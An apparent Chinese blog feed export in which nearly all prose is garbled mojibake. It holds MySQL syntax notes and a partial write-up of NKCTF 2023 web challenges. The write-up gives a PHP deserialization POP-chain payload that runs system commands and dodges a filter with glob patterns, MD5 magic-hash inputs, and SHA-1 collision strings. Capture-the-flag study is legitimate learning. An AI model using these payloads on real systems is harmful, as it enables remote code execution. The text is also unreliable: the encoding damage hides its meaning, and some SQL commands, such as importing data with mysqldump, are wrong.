<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æŠŠå­—æ®µ c çš„ç±»å‹ä» CHAR(1) æ”¹ä¸º CHAR(10)</span><br><span class="line">alter table è¡¨å modify c char(10);</span><br><span class="line">åœ¨ CHANGE å…³é”®å­—ä¹‹åï¼Œç´§è·Ÿç€çš„æ˜¯ä½ è¦ä¿®æ”¹çš„å­—æ®µåï¼Œç„¶åæŒ‡å®šæ–°å­—æ®µååŠç±»å‹</span><br><span class="line">alter table è¡¨å change i ä¿®æ”¹çš„å ç±»å‹;</span><br></pre></td></tr></table></figure>

<p><strong>ä¿®æ”¹Null å€¼å’Œé»˜è®¤å€¼</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table è¡¨å modify j bigint not null default 100;</span><br><span class="line">å°†jä¿®æ”¹ä¸ºbigintç±»å‹å¹¶ä¸”ä¿®æ”¹ä¸ºéç©ºé»˜è®¤å€¼ä¸º100</span><br></pre></td></tr></table></figure>

<p><strong>ä¿®æ”¹å­—æ®µé»˜è®¤å€¼</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table è¡¨å alter i set default 1000;</span><br><span class="line">æ˜¯å°†iå­—æ®µçš„é»˜è®¤å€¼ä¿®æ”¹ä¸º1000</span><br></pre></td></tr></table></figure>

<h4 id="20-åˆ›å»ºä¸´æ—¶è¡¨"><a href="#20-åˆ›å»ºä¸´æ—¶è¡¨" class="headerlink" title="20.åˆ›å»ºä¸´æ—¶è¡¨"></a><strong>20.åˆ›å»ºä¸´æ—¶è¡¨</strong></h4><p>ä¸´æ—¶è¡¨åªåœ¨å½“å‰è¿æ¥å¯è§ï¼Œå½“å…³é—­è¿æ¥æ—¶ï¼ŒMysqlä¼šè‡ªåŠ¨åˆ é™¤è¡¨å¹¶é‡Šæ”¾æ‰€æœ‰ç©ºé—´</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create temporary table è¡¨å(åˆ—å ç±»å‹);</span><br></pre></td></tr></table></figure>

<p>ä¸´æ—¶è¡¨ä¹Ÿå¯ä»¥åœ¨mysqlä¼šè¯æ—¶åˆ é™¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop table è¡¨å;</span><br></pre></td></tr></table></figure>

<h4 id="21-å¤åˆ¶è¡¨"><a href="#21-å¤åˆ¶è¡¨" class="headerlink" title="21.å¤åˆ¶è¡¨"></a>21.å¤åˆ¶è¡¨</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table æ–°è¡¨ select * from æ—§è¡¨;</span><br></pre></td></tr></table></figure>

<h4 id="22-select-intoè¯­å¥-æ— æ³•ä½¿ç”¨"><a href="#22-select-intoè¯­å¥-æ— æ³•ä½¿ç”¨" class="headerlink" title="22.select intoè¯­å¥  (æ— æ³•ä½¿ç”¨)"></a>22.select intoè¯­å¥  (<u>æ— æ³•ä½¿ç”¨</u>)</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * into è¡¨1 from è¡¨2;//æ˜¯æŠŠè¡¨2ä¸­çš„æ•°æ®å…¨éƒ½å¤åˆ¶åˆ°è¡¨1ä¸­</span><br><span class="line">select åˆ—å1,åˆ—å2 into è¡¨1 from è¡¨2;//æ˜¯æŠŠè¡¨2ä¸­çš„åˆ—å1å’Œåˆ—å2å¤åˆ¶åˆ°è¡¨1ä¸­</span><br></pre></td></tr></table></figure>

<h4 id="23-å…ƒæ•°æ®"><a href="#23-å…ƒæ•°æ®" class="headerlink" title="23.å…ƒæ•°æ®"></a>23.å…ƒæ•°æ®</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select version();//å¯ä»¥æŸ¥çœ‹æœåŠ¡å™¨ç‰ˆæœ¬ä¿¡æ¯</span><br><span class="line">select database();//æŸ¥çœ‹å½“å‰æ•°æ®åº“å</span><br><span class="line">select user();//å½“å‰ç”¨æˆ·å</span><br><span class="line">show columns from è¡¨å;//å¯ä»¥æŸ¥çœ‹è¡¨ä¸­çš„å­—æ®µ</span><br></pre></td></tr></table></figure>

<h4 id="24-åºåˆ—"><a href="#24-åºåˆ—" class="headerlink" title="24.åºåˆ—"></a>24.åºåˆ—</h4><p><strong>ä½¿ç”¨ AUTO_INCREMENTè‡ªå¢</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table insect (id int unsigned not null auto_increment,primary key (id));</span><br><span class="line">//è¿™æ˜¯åˆ›å»ºinsectè¡¨ï¼Œå¹¶ä¸”è§„å®šä¸€ä¸ªidå­—æ®µï¼Œè®¾ç½®ä¸ºä¸å…è®¸æ’å…¥è´Ÿæ•°(unsigned)ï¼Œéç©º(not null)ï¼Œå®ç°å­—æ®µè‡ªå¢(auto_increment)ï¼Œå’Œä¸»é”®(primary key())</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table è¡¨å add id int auto_increment primary key;</span><br><span class="line">å¯ä»¥åœ¨å·²ç»åˆ›å»ºçš„è¡¨ä¸Šä½¿ç”¨AUTO_INCREMENT</span><br></pre></td></tr></table></figure>

<p><strong>è®¾ç½®åºåˆ—çš„å¼€å§‹å€¼</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table è¡¨å auto_increment = 100;</span><br><span class="line">//å°±æ˜¯æŠŠè¡¨åçš„åºåˆ—å¼€å§‹å€¼è®¾ç½®ä¸º100</span><br></pre></td></tr></table></figure>

<p><strong>åˆ é™¤AUTO_INCREMENT</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table è¡¨å change i ä¿®æ”¹çš„å ç±»å‹;//å¯ä»¥å°†AUTO_INCREMENTæ¶ˆé™¤</span><br></pre></td></tr></table></figure>

<h4 id="25-å¤„ç†é‡å¤æ•°æ®"><a href="#25-å¤„ç†é‡å¤æ•°æ®" class="headerlink" title="25.å¤„ç†é‡å¤æ•°æ®"></a>25.å¤„ç†é‡å¤æ•°æ®</h4><p><strong>é˜²æ­¢è¡¨ä¸­å‡ºç°é‡å¤æ•°æ®</strong></p>
<p>å°†æŒ‡å®šçš„å­—æ®µè®¾ç½®ä¸ºprimary key(ä¸»é”®)æˆ–è€…unique(å”¯ä¸€)æ¥ä¿è¯æ•°æ®çš„å”¯ä¸€æ€§</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE person_tbl</span><br><span class="line">(</span><br><span class="line">   first_name CHAR(20) NOT NULL,</span><br><span class="line">   last_name CHAR(20) NOT NULL,</span><br><span class="line">   sex CHAR(10),</span><br><span class="line">   PRIMARY KEY (last_name, first_name)  //åˆ›å»ºåŒä¸»é”®</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p><strong>ç»Ÿè®¡é‡å¤æ•°æ®</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select åˆ—å,count(*) from è¡¨å group by åˆ—å</span><br><span class="line">//å¯ä»¥æ ¹æ®byåé¢çš„åˆ—åè¿›è¡Œç­›é€‰ï¼Œcount(*)æ˜¯ç»Ÿè®¡æ”¹åå‡ºç°çš„ä¸ªæ•°</span><br></pre></td></tr></table></figure>

<h4 id="26-å¯¼å‡ºæ•°æ®"><a href="#26-å¯¼å‡ºæ•°æ®" class="headerlink" title="26.å¯¼å‡ºæ•°æ®"></a>26.å¯¼å‡ºæ•°æ®</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqldump -u ç”¨æˆ· -p å¯†ç  runoob_tbl &gt; dump.txt</span><br></pre></td></tr></table></figure>

<h4 id="27-å¯¼å…¥æ•°æ®"><a href="#27-å¯¼å…¥æ•°æ®" class="headerlink" title="27.å¯¼å…¥æ•°æ®"></a>27.å¯¼å…¥æ•°æ®</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqldump -u ç”¨æˆ· -p å¯†ç  runoob_tbl &lt; dump.txt</span><br></pre></td></tr></table></figure>

<h4 id="28-ç´¢å¼•"><a href="#28-ç´¢å¼•" class="headerlink" title="28.ç´¢å¼•"></a>28.ç´¢å¼•</h4><p><strong><u>æ™®é€šç´¢å¼•</u></strong></p>
<p>åˆ›å»ºç´¢å¼•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¸€</span><br><span class="line">create index ç´¢å¼•å on è¡¨å(åˆ—å);</span><br><span class="line">äºŒ</span><br><span class="line">create table è¡¨å(åˆ—å ç±»å‹ï¼Œåˆ—å ç±»å‹ï¼Œç´¢å¼•å (åˆ—å));</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹ç´¢å¼•(æ·»åŠ ç´¢å¼•)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table è¡¨å add index ç´¢å¼•å(åˆ—å);</span><br></pre></td></tr></table></figure>

<p>åˆ é™¤ç´¢å¼•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table è¡¨å drop index ç´¢å¼•å;</span><br><span class="line">drop index ç´¢å¼•å on è¡¨å;</span><br></pre></td></tr></table></figure>

<p><u><strong>å”¯ä¸€ç´¢å¼•</strong></u></p>
<p>ç´¢å¼•åˆ—çš„å€¼å¿…é¡»å”¯ä¸€ï¼Œä½†å…è®¸æœ‰ç©ºå€¼</p>
<p>åˆ›å»ºç´¢å¼•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¸€</span><br><span class="line">create unique index ç´¢å¼•å on è¡¨å(åˆ—å);</span><br><span class="line">äºŒ</span><br><span class="line">create table è¡¨å(åˆ—å ç±»å‹ï¼Œåˆ—å ç±»å‹ï¼Œunique ç´¢å¼•å (åˆ—å));</span><br></pre></td></tr></table></figure>

<p><strong>ä¿®æ”¹ç´¢å¼•</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table è¡¨å add unique index ç´¢å¼•å(åˆ—å);</span><br></pre></td></tr></table></figure>

<p><strong><u>ä½¿ç”¨alteræ¥æ·»åŠ å’Œåˆ é™¤ä¸»é”®</u></strong></p>
<p>ä¸€å¼ è¡¨åªèƒ½æœ‰ä¸€ä¸ªä¸»é”®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table è¡¨å add primary key(åˆ—å);//å»ºç«‹ä¸»é”®</span><br><span class="line">alter table è¡¨å drop primary key;//åˆ é™¤ä¸»é”®</span><br></pre></td></tr></table></figure>

<h4 id="29-checkçº¦æŸ"><a href="#29-checkçº¦æŸ" class="headerlink" title="29.checkçº¦æŸ"></a>29.checkçº¦æŸ</h4><p><strong>åˆ›å»ºè¡¨æ—¶è¿›è¡Œcheckçº¦æŸ</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table è¡¨å</span><br><span class="line">(</span><br><span class="line">id int,</span><br><span class="line">check (id&gt;0)</span><br><span class="line">)</span><br><span class="line">//è¿™æ˜¯çº¦æŸidçš„å€¼å¿…é¡»å¤§äº0</span><br></pre></td></tr></table></figure>

<p><strong>åœ¨å·²ç»åˆ›å»ºçš„è¡¨çš„åˆ—ä¸Šæ·»åŠ çº¦æŸ</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table è¡¨å add check (id&gt;0);</span><br><span class="line">åœ¨idåˆ—åˆ›å»ºçº¦æŸ</span><br></pre></td></tr></table></figure>

<p><strong>æ’¤é”€çº¦æŸ</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table è¡¨å drop check</span><br></pre></td></tr></table></figure>

<h4 id="30-äº‹åŠ¡"><a href="#30-äº‹åŠ¡" class="headerlink" title="30.äº‹åŠ¡"></a>30.äº‹åŠ¡</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beginå¼€å§‹ä¸€ä¸ªäº‹åŠ¡</span><br><span class="line">rollbackäº‹åŠ¡å›æ»š</span><br><span class="line">commitäº‹åŠ¡ç¡®è®¤</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>2023 nkctfçš„webéƒ¨åˆ†è§£é¢˜</title>
    <url>/2023/03/29/nkctf%20web/</url>
    <content><![CDATA[<p>ååºåˆ—åŒ–å’Œç»•è¿‡å¼ºï¼Œå¼±æ¯”è¾ƒ</p>
<span id="more"></span>

<h2 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h2><p>1.é¦–å…ˆæ˜¯æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;oww!man!!&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="string">&#x27;ItS SO CREAZY&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;name == <span class="string">&#x27;welcome_to_NKCTF&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;arg;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>, <span class="variable">$string</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;you are bad&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Happy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shell</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$shell</span> = <span class="variable language_">$this</span>-&gt;shell;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="variable language_">$this</span>-&gt;cmd;</span><br><span class="line">        <span class="title function_ invoke__">waf</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$shell</span>(<span class="variable">$cmd</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hell0</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;func;</span><br><span class="line">        <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æœ‰unserialize()å‡½æ•°ï¼Œä¸€çœ‹å°±æ˜¯ä¸€ä¸ªååºåˆ—åŒ–ï¼Œè¿˜æœ‰__destruct()å‡½æ•°ï¼Œä½¿ç”¨ååºåˆ—åŒ–å‡½æ•°æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨è¿™ä¸ªå‡½æ•°</p>
<p>2.è¿™é“é¢˜çš„popé“¾é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œä½¿ç”¨çš„é­”æœ¯æ–¹æ³•ä¹Ÿæ¯”è¾ƒå°‘</p>
<p>ç›´æ¥æ¥æ„é€ popé“¾</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unserialize() =&gt; __destruct() -&gt; $arg =&gt; __toString() -&gt; $func =&gt; __invoke() -&gt; eval($shell($cmd))</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥ä¸Špayload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;welcome_to_NKCTF&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;oww!man!!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Happy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shell</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&#x27;more /[e-h][k-m][0-b][e-h]&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hell0</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$we</span>=<span class="keyword">new</span> <span class="title class_">Welcome</span>();</span><br><span class="line"><span class="variable">$ha</span>=<span class="keyword">new</span> <span class="title class_">Happy</span>();</span><br><span class="line"><span class="variable">$ho</span>=<span class="keyword">new</span> <span class="title class_">Hell0</span>();</span><br><span class="line"><span class="variable">$we</span>-&gt;arg=<span class="variable">$ho</span>;</span><br><span class="line"><span class="variable">$we</span>-&gt;arg-&gt;func=<span class="variable">$ha</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$we</span>));</span><br></pre></td></tr></table></figure>

<p>3.è¿™é‡Œä¸»è¦çš„éš¾ç‚¹æ˜¯ä¸€ä¸ªæ­£åˆ™åŒ¹é…</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>, <span class="variable">$string</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;you are bad&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªæ­£åˆ™åŒ¹é…çš„æ„æ€æ˜¯åŒ¹é…fï¼Œlï¼Œaï¼Œgï¼Œ*ï¼Œ?è¿™å‡ ä¸ªå­—ç¬¦ï¼Œå¹¶ä¸”ä¸åŒºåˆ†å¤§å°å†™ï¼Œ</p>
<p>è¯»å–flagæ–‡ä»¶ï¼Œé€šå¸¸ä¼šä½¿ç”¨catï¼Œä½†æ˜¯catä¸­å«æœ‰aå­—ç¬¦ï¼Œå¯ä»¥ç”¨moreæ¥ä»£æ›¿cat</p>
<p>æ¥ä¸‹æ¥å°±æ˜¯è€ƒè™‘å¯ä»¥ç”¨ä»€ä¹ˆæ¥ä»£æ›¿flagï¼Œè¿™é‡Œçœ‹wpçŸ¥é“globé€šé…ç¬¦</p>
<p>çœ‹asciiç è¡¨ï¼Œfä½äºeå’Œhä¹‹é—´ï¼Œlä½äºkå’Œmä¹‹é—´ï¼Œaå¯ä»¥å½“æˆåœ¨0å’Œbä¹‹é—´ï¼Œgåœ¨eå’Œhä¹‹é—´</p>
<p><img src="/2023/03/29/nkctf%20web/image-20230403210845208.png" alt="image-20230403210845208"></p>
<p>æ‰€ä»¥flagå¯ä»¥ä½¿ç”¨<code>[e-h][k-m][0-b][e-h]</code>æ¥ä»£æ›¿</p>
<h2 id="ç»•è¿‡å¼ºï¼Œå¼±æ¯”è¾ƒ"><a href="#ç»•è¿‡å¼ºï¼Œå¼±æ¯”è¾ƒ" class="headerlink" title="ç»•è¿‡å¼ºï¼Œå¼±æ¯”è¾ƒ"></a>ç»•è¿‡å¼ºï¼Œå¼±æ¯”è¾ƒ</h2><p>1.ä¸Šæºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>] != (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;d&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;d&#x27;</span>]))&#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;e&#x27;</span>] != <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;e&#x27;</span>]) == <span class="number">114514</span>)&#123;</span><br><span class="line"><span class="comment">//            phpinfo();</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NS_CTF.go&#x27;</span>]))&#123;</span><br><span class="line"><span class="comment">//                phpinfo();</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">                    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9a-zA-Z]/i&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">                        <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&#x27;error!!!!!!&#x27;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;error!!!!!&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;error!!!!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error!!!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error!!&#x27;</span>);</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰å¾ˆå¤šåŒ¹é…ï¼Œéœ€è¦å°†è¿™äº›åŒ¹é…å…¨éƒ¨éƒ½ç»•è¿‡ï¼Œæ‰èƒ½è¾¾åˆ°<code>eval($_POST[&#39;cmd&#39;]);</code>å‘½ä»¤</p>
<p>2.å…ˆçœ‹ç¬¬ä¸€ä¸ª</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå¯ä»¥ä½¿ç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=s1885207154a&amp;b=s1836677006a</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸¤ä¸ªæ•°å€¼ç»è¿‡md5åŠ å¯†åï¼Œéƒ½æ˜¯ä»¥0eå¼€å¤´çš„ï¼Œä»¥0eå¼€å¤´çš„æ•°éƒ½ç­‰äº0</p>
<p>ç¬¬äºŒä¸ª</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>] != (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;d&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;d&#x27;</span>])</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªé€šè¿‡æœåˆ°èµ„æ–™æ‰¾åˆ°å¯ä»¥ä½¿ç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;d=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸‰ä¸ª</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;e&#x27;</span>] != <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;e&#x27;</span>]) == <span class="number">114514</span></span><br></pre></td></tr></table></figure>

<p>intval()å‡½æ•°æ˜¯è·å–å˜é‡çš„æ•´æ•°å€¼</p>
<p>å¯ä»¥ä½¿ç”¨</p>
